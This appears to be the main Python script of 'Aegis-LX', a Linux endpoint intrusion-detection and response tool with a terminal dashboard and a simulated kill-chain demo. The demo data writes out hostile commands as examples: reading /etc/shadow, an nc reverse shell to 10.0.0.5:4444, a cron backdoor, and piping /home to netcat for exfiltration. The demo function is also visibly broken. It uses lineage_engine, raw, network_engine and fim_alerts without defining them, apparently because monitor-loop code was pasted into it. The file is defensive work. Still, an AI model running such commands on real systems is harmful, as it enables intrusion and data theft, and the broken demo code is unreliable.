"""
aegis.py - Aegis-LX v3.0
"""
import time, argparse, signal, sys, os
from datetime import datetime
from observer.system_observer import collect_process_info, collect_file_events
from detection.network_engine import NetworkEngine
from detection.fim_engine import FIMEngine
from detection.lineage_engine import LineageEngine
from translator.signal_translator import translate_process_to_signals
from detection.stat_engine import StatEngine
from detection.signature_engine import SignatureEngine
from response.tier_manager import TierManager, TIER_NAMES
from response.response_engine import apply_tier, flush_all_rules
from alert.notifier import alert_tier_change, alert_lockdown_prompt, notify
from logger.logger import AegisLogger

R   = "\033[0m"
B   = "\033[1m"
DIM = "\033[2m"
G   = "\033[92m"
Y   = "\033[93m"
RE  = "\033[91m"
C   = "\033[96m"
M   = "\033[95m"
W   = "\033[97m"
TIER_C = {0:G, 1:C, 2:Y, 3:Y, 4:RE, 5:M}

BANNER = (
    "\n" + C + B +
    "  +================================================================+\n"
    "  |        A E G I S - L X   v3.0                                 |\n"
    "  |        Adaptive Linux Endpoint Security Engine                 |\n"
    "  |        Statistical Anomaly + MITRE Kill Chain Detection        |\n"
    "  +================================================================+\n"
    + R + "\n"
)

def print_header(cycle, tier_manager, warming_up):
    tier  = tier_manager.current
    tc    = TIER_C[tier]
    ts    = datetime.now().strftime("%Y-%m-%d  %H:%M:%S")
    warm  = "  " + C + "WARMING UP" + R if warming_up else ""
    line  = "=" * 70
    print("\n" + DIM + line + R)
    print("  " + B + "AEGIS-LX SOC" + R + "  |  " + DIM + "Cycle " + str(cycle).zfill(5) + R + "  |  " + ts + warm)
    print("  Active Response: " + tc + B + "TIER " + str(tier) + " -- " + TIER_NAMES[tier] + R)
    print(DIM + line + R)

def print_stat_panel(report):
    level = report.get("risk_level", "LOW")
    lc    = RE if level == "HIGH" else (Y if level == "MEDIUM" else G)
    print("\n  " + C + "+-- BEHAVIOURAL ENGINE (Z-Score)" + R +
          "  risk=" + lc + B + level + R +
          "  events=" + str(report.get("total_events",0)) +
          "  unique=" + str(report.get("unique_procs",0)))
    anomalies = report.get("anomalies", [])
    if not anomalies:
        print("  " + C + "|" + R + "  " + G + "All behavioural metrics within normal range" + R)
    for a in anomalies:
        sc = RE if a["severity"] in ("CRITICAL","HIGH") else Y
        print("  " + C + "|" + R + "  " + sc + "! [" + a["layer"] + "]" + R + " " + a["detail"])
    print("  " + C + "+" + "-"*50 + R)

def print_sig_panel(sig_result):
    level = sig_result["risk_level"]
    lc    = RE if level == "HIGH" else (Y if level == "MEDIUM" else G)
    hits  = sig_result["hits"]
    print("\n  " + M + "+-- SIGNATURE ENGINE (MITRE ATT&CK)" + R +
          "  risk=" + lc + B + level + R + "  score=" + str(sig_result["score"]))
    if not hits:
        print("  " + M + "|" + R + "  " + G + "No known attack signatures detected" + R)
    for h in hits[:4]:
        cmd = h.get("full_cmd","")[:55]
        print("  " + M + "|" + R + "  " + RE + "! [" + h["phase"] + "]" + R + " " + cmd)
        print("  " + M + "|" + R + "    " + DIM + "-> " + h["mitre"][:65] + R)
    print("  " + M + "+" + "-"*50 + R)

def print_fim_panel(fim_alerts):
    print("\n  " + G + "+-- FILE INTEGRITY MONITOR (openat hook)" + R)
    if not fim_alerts:
        print("  " + G + "|" + R + "  " + G + "No sensitive file access detected" + R)
    for a in fim_alerts:
        tc = RE if a["tier"] >= 3 else Y
        print("  " + G + "|" + R + "  " + tc + "! [" + a["phase"] + "] " + a["process"] + " opened " + a["filename"] + R)
        print("  " + G + "|" + R + "    " + DIM + "-> " + a["mitre"] + "  Tier " + str(a["tier"]) + R)
    print("  " + G + "+" + "-"*50 + R)


def print_lineage_panel(lineage_alerts):
    print("\n  " + C + "+-- PROCESS LINEAGE MONITOR (fork/exec tracking)" + R)
    if not lineage_alerts:
        print("  " + C + "|" + R + "  " + G + "No suspicious parent-child relationships detected" + R)
    for a in lineage_alerts:
        tc = RE if a["tier"] >= 4 else Y
        print("  " + C + "|" + R + "  " + tc + "! [" + a["phase"] + "] " +
              a["parent_name"] + " (PID " + str(a["parent_pid"]) + ")" +
              " --> " + a["child_name"] + " (PID " + str(a["child_pid"]) + ")" + R)
        print("  " + C + "|" + R + "    " + DIM + "cmd: " + a["full_cmd"][:60] + R)
        print("  " + C + "|" + R + "    " + DIM + "-> " + a["mitre"][:65] + "  Tier " + str(a["tier"]) + R)
    print("  " + C + "+" + "-"*50 + R)


def print_network_panel(net_alerts):
    print("\n  " + W + "+-- NETWORK MONITOR (sys_connect hook)" + R)
    if not net_alerts:
        print("  " + W + "|" + R + "  " + G + "No suspicious outbound connections detected" + R)
    for a in net_alerts:
        tc = RE if a["tier"] >= 4 else Y
        print("  " + W + "|" + R + "  " + tc + "! [" + a["phase"] + "] " +
              a["process"] + " -> " + a["dest"] + R)
        print("  " + W + "|" + R + "    " + DIM + "-> " + a["mitre"][:65] +
              "  Tier " + str(a["tier"]) + R)
    print("  " + W + "+" + "-"*50 + R)


PHASE_ORDER = ["RECON","DISCOVERY","CREDENTIAL","EXECUTION","PERSISTENCE","EXFILTRATION","LATERAL"]

def print_killchain_panel(sig_result, tier_manager):
    active = set(sig_result.get("phases", []))
    print("\n  " + Y + "+-- KILL CHAIN TRACKER" + R)
    row = "  |  "
    for ph in PHASE_ORDER:
        if ph in active:
            row += RE + B + "[" + ph[:5] + "]" + R + " "
        else:
            row += DIM + "[" + ph[:5] + "]" + R + " "
    print("  " + Y + "|" + R + row)
    hp = ", ".join(sorted(set(tier_manager.threat_history) - {"SAFE"}))
    if hp:
        print("  " + Y + "|" + R + "  " + DIM + "Recent history: " + hp + R)
    print("  " + Y + "+" + "-"*50 + R)

TIER_DESC = {
    0: "Observing -- no active defences",
    1: "Alert sent -- monitoring intensified",
    2: "Suspect process CPU-throttled (PID-targeted, legit users unaffected)",
    3: "Suspect process network-contained (PID-targeted, admin SSH safe)",
    4: "All NEW outbound blocked -- established sessions preserved",
    5: "FULL LOCKDOWN -- awaiting manual operator release",
}
TIER_BADGE = {0:G+"o"+R, 1:C+"o"+R, 2:Y+"o"+R, 3:Y+"o"+R, 4:RE+"o"+R, 5:M+"o"+R}

def print_tier_panel(tier_manager, change):
    tier  = tier_manager.current
    tc    = TIER_C[tier]
    print("\n  " + W + "+-- RESPONSE TIER" + R)
    print("  " + W + "|" + R + "  " + TIER_BADGE[tier] + " " + tc + B + "TIER " + str(tier) + ": " + TIER_NAMES[tier] + R)
    print("  " + W + "|" + R + "  " + DIM + TIER_DESC[tier] + R)
    if change["changed"]:
        arrow = "^^ UP" if change["direction"] == "UP" else "vv DOWN"
        cc    = RE if change["direction"] == "UP" else G
        print("  " + W + "|" + R + "  " + cc + B + arrow + " " +
              change["old_name"] + " -> " + change["new_name"] + R +
              "  " + DIM + change["reason"][:60] + R)
    if tier == 5:
        print("  " + W + "|" + R + "  " + M + B + "Run: sudo python3 aegis.py --release  to step down" + R)
    print("  " + W + "+" + "-"*50 + R)

DEMO_SCRIPT = [
    ("IDLE",        "System is quiet. Aegis warming up...", []),
    ("IDLE",        "Normal activity observed.", []),
    ("RECON",       "Attacker starts network scan (nmap)", [
        {"signal_type":"nmap","phase":"RECON","severity":15,"raw_weight":15,
         "mitre":"T1046 (Network Service Discovery)",
         "context":{"full_cmd":"nmap -sV 192.168.1.0/24","pid":9001,"user":"attacker","timestamp":"now"}}]),
    ("DISCOVERY",   "Attacker runs LinPEAS recon script", [
        {"signal_type":"linpeas","phase":"DISCOVERY","severity":28,"raw_weight":28,
         "mitre":"T1082 (System Information Discovery)",
         "context":{"full_cmd":"./linpeas.sh","pid":9002,"user":"attacker","timestamp":"now"}}]),
    ("CREDENTIAL",  "Attacker reads /etc/shadow", [
        {"signal_type":"cat","phase":"CREDENTIAL","severity":25,"raw_weight":25,
         "mitre":"T1003.008 (/etc/shadow Access)",
         "context":{"full_cmd":"cat /etc/shadow","pid":9003,"user":"attacker","timestamp":"now"}}]),
    ("EXECUTION",   "Attacker opens reverse shell (nc)", [
        {"signal_type":"nc","phase":"EXECUTION","severity":22,"raw_weight":22,
         "mitre":"T1095 (Non-Application Layer Protocol)",
         "context":{"full_cmd":"nc -e /bin/bash 10.0.0.5 4444","pid":9004,"user":"attacker","timestamp":"now"}}]),
    ("PERSISTENCE", "Attacker adds cron backdoor", [
        {"signal_type":"crontab","phase":"PERSISTENCE","severity":18,"raw_weight":18,
         "mitre":"T1053.003 (Cron Persistence)",
         "context":{"full_cmd":"crontab -e /etc/cron.d/backdoor","pid":9005,"user":"attacker","timestamp":"now"}}]),
    ("EXFILTRATION","Attacker exfiltrates data via netcat", [
        {"signal_type":"nc","phase":"EXFILTRATION","severity":30,"raw_weight":30,
         "mitre":"T1048 (Exfil via Netcat)",
         "context":{"full_cmd":"tar czf - /home | nc 10.0.0.5 9999","pid":9006,"user":"attacker","timestamp":"now"}}]),
    ("COOLDOWN",    "Threat cleared. System de-escalating...", []),
    ("COOLDOWN",    "Continuing cool-down...", []),
    ("NORMAL",      "System returned to normal posture.", []),
]

def run_demo(logger):
    print(BANNER)
    print("  " + Y + B + "DEMO MODE -- Simulating MITRE ATT&CK Kill Chain" + R)
    print("  " + DIM + "No real attack tools running. Safe simulation." + R + "\n")
    time.sleep(2)
    stat_engine  = StatEngine()
    sig_engine   = SignatureEngine()
    tier_manager = TierManager()
    cycle        = 0
    for phase_label, description, fake_signals in DEMO_SCRIPT:
        cycle += 1
        time.sleep(3)
        print("\n" + M + B + "  >> DEMO STEP " + str(cycle) + ": [" + phase_label + "] " + description + R)
        logger.log_demo_event(phase_label, description)
        stat_report = stat_engine.observe(fake_signals)
        sig_result  = sig_engine.analyze(fake_signals)
        # LINEAGE: analyze exec events using /proc for parent resolution
        lineage_alerts = lineage_engine.analyze(raw)

        for alert in lineage_alerts:
            logger.log_risk({"tier": alert["tier"], "stat_level": "LINEAGE",
                             "sig_score": 0, "phases": [alert["phase"]],
                             "lineage_detail": alert["detail"]})
            if alert["tier"] > tier_manager.current:
                lin_change = tier_manager._escalate_to(
                    alert["tier"],
                    "[LINEAGE] " + alert["detail"],
                    __import__('time').time()
                )
                apply_tier(lin_change["new_tier"], lin_change["old_tier"], [])
                alert_tier_change(lin_change["old_tier"], lin_change["new_tier"],
                                  lin_change["reason"], [])
                logger.log_tier_change(lin_change)

        # NETWORK: check outbound connections this cycle
        net_alerts     = network_engine.analyze()

        for alert in net_alerts:
            logger.log_risk({"tier": alert["tier"], "stat_level": "NETWORK",
                             "sig_score": 0, "phases": [alert["phase"]],
                             "net_detail": alert["detail"]})
            if alert["tier"] > tier_manager.current:
                net_change = tier_manager._escalate_to(
                    alert["tier"],
                    "[NET] " + alert["detail"],
                    __import__('time').time()
                )
                apply_tier(net_change["new_tier"], net_change["old_tier"], [])
                alert_tier_change(net_change["old_tier"], net_change["new_tier"],
                                  net_change["reason"], [])
                logger.log_tier_change(net_change)

        change      = tier_manager.evaluate(stat_report, sig_result)
        if change["changed"]:
            apply_tier(change["new_tier"], change["old_tier"], sig_result["hits"])
            alert_tier_change(change["old_tier"], change["new_tier"], change["reason"], sig_result["hits"])
            logger.log_tier_change(change)
        print_header(cycle, tier_manager, stat_report.get("warming_up", False))
        print_stat_panel(stat_report)
        print_sig_panel(sig_result)
        print_fim_panel(fim_alerts)
        print_lineage_panel(lineage_alerts)
        print_network_panel(net_alerts)
        print_killchain_panel(sig_result, tier_manager)
        print_tier_panel(tier_manager, change)
    print("\n  " + G + B + "Demo complete. All tiers demonstrated." + R)
    print("  " + DIM + "Run --monitor to start real monitoring." + R + "\n")

def run_monitor(logger):
    print(BANNER)
    print("  " + G + "Starting Aegis-LX monitoring..." + R)
    print("  " + DIM + "Behavioural engine warm-up: ~2 minutes" + R)
    print("  " + DIM + "Signature engine: ACTIVE immediately" + R)
    print("  " + DIM + "Ctrl+C to stop  |  sudo python3 aegis.py --lockdown for Tier 5" + R + "\n")
    stat_engine  = StatEngine()
    sig_engine   = SignatureEngine()
    fim_engine     = FIMEngine()
    lineage_engine  = LineageEngine()
    network_engine  = NetworkEngine()
    tier_manager    = TierManager()
    cycle        = 0

    def on_exit(sig, frame):
        print("\n\n  " + Y + "Shutting down -- flushing iptables rules..." + R)
        flush_all_rules()
        print("  " + G + "Clean exit." + R + "\n")
        sys.exit(0)
    signal.signal(signal.SIGINT, on_exit)
    signal.signal(signal.SIGTERM, on_exit)

    while True:
        cycle += 1
        if os.path.exists(".aegis_lockdown") and tier_manager.current < 5:
            change = tier_manager.manual_lockdown("Operator flag file detected")
            apply_tier(5, tier_manager.current, [])
            alert_tier_change(change["old_tier"], 5, "Manual lockdown", [])
            logger.log_tier_change(change)
        if not os.path.exists(".aegis_lockdown") and tier_manager.lockdown_manual:
            change = tier_manager.manual_release()
            apply_tier(change["new_tier"], 5, [])
            logger.log_tier_change(change)
        raw = collect_process_info()
        signals = []
        for proc in raw:
            translated = translate_process_to_signals(proc)
            signals.extend(translated)
            for s in translated:
                logger.log_signal(s)
        stat_report = stat_engine.observe(signals)
        sig_result  = sig_engine.analyze(signals)

        # FIM: check what files were opened this cycle
        file_events = collect_file_events()
        fim_alerts  = fim_engine.analyze(file_events)

        # If FIM caught something, escalate tier directly to the alert's tier
        for alert in fim_alerts:
            logger.log_risk({"tier": alert["tier"], "stat_level": "FIM",
                             "sig_score": 0, "phases": [alert["phase"]],
                             "fim_detail": alert["detail"]})
            if alert["tier"] > tier_manager.current:
                fim_change = tier_manager._escalate_to(
                    alert["tier"],
                    "[FIM] " + alert["detail"],
                    __import__('time').time()
                )
                apply_tier(fim_change["new_tier"], fim_change["old_tier"], [])
                alert_tier_change(fim_change["old_tier"], fim_change["new_tier"],
                                  fim_change["reason"], [])
                logger.log_tier_change(fim_change)

        change      = tier_manager.evaluate(stat_report, sig_result)
        if change["changed"]:
            apply_tier(change["new_tier"], change["old_tier"], sig_result["hits"])
            alert_tier_change(change["old_tier"], change["new_tier"], change["reason"], sig_result["hits"])
            logger.log_tier_change(change)
            if change["new_tier"] == 4 and change["direction"] == "UP":
                alert_lockdown_prompt()
        logger.log_risk({
            "tier": tier_manager.current,
            "stat_level": stat_report.get("risk_level"),
            "sig_score": sig_result["score"],
            "phases": sig_result["phases"],
        })
        print_header(cycle, tier_manager, stat_report.get("warming_up", False))
        print_stat_panel(stat_report)
        print_sig_panel(sig_result)
        print_killchain_panel(sig_result, tier_manager)
        print_tier_panel(tier_manager, change)
        time.sleep(10)

def run_lockdown(logger):
    from response.response_engine import _escalate
    print("\n  " + M + B + "MANUAL LOCKDOWN REQUESTED" + R)
    confirm = input("  " + Y + "Type CONFIRM to proceed: " + R).strip()
    if confirm != "CONFIRM":
        print("  " + G + "Lockdown cancelled." + R)
        return
    with open(".aegis_lockdown", "w") as f:
        f.write("MANUAL")
    print("  " + M + B + "Tier 5 LOCKDOWN activated." + R)
    print("  " + DIM + "To release: sudo python3 aegis.py --release" + R + "\n")
    notify(5, "Aegis-LX LOCKDOWN", "Manual Tier 5 Lockdown activated by operator")
    _escalate(5, [])

def run_release():
    if os.path.exists(".aegis_lockdown"):
        os.remove(".aegis_lockdown")
        print("\n  " + G + B + "Lockdown flag removed. Monitor stepping down to Tier 4." + R + "\n")
        notify(1, "Aegis-LX Released", "Manual lockdown released by operator")
    else:
        print("  " + Y + "No manual lockdown active." + R)

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Aegis-LX v3.0")
    parser.add_argument("--monitor",  action="store_true")
    parser.add_argument("--demo",     action="store_true")
    parser.add_argument("--lockdown", action="store_true")
    parser.add_argument("--release",  action="store_true")
    parser.add_argument("--status",   action="store_true")
    args = parser.parse_args()
    logger = AegisLogger()
    if args.monitor:
        run_monitor(logger)
    elif args.demo:
        run_demo(logger)
    elif args.lockdown:
        run_lockdown(logger)
    elif args.release:
        run_release()
    elif args.status:
        raw = collect_process_info()
        signals = []
        for proc in raw:
            signals.extend(translate_process_to_signals(proc))
        se = StatEngine(); sige = SignatureEngine(); tm = TierManager()
        sr = se.observe(signals); sigr = sige.analyze(signals); chg = tm.evaluate(sr, sigr)
        print(BANNER)
        print_header(1, tm, sr.get("warming_up", False))
        print_stat_panel(sr); print_sig_panel(sigr)
        print_killchain_panel(sigr, tm); print_tier_panel(tm, chg)
    else:
        print("\n  " + B + "Aegis-LX v3.0" + R)
        print("    sudo python3 aegis.py --monitor    Start monitoring")
        print("    sudo python3 aegis.py --demo       Demo mode")
        print("    sudo python3 aegis.py --lockdown   Manual Tier 5")
        print("    sudo python3 aegis.py --release    Release lockdown")
        print("    sudo python3 aegis.py --status     Single snapshot\n")
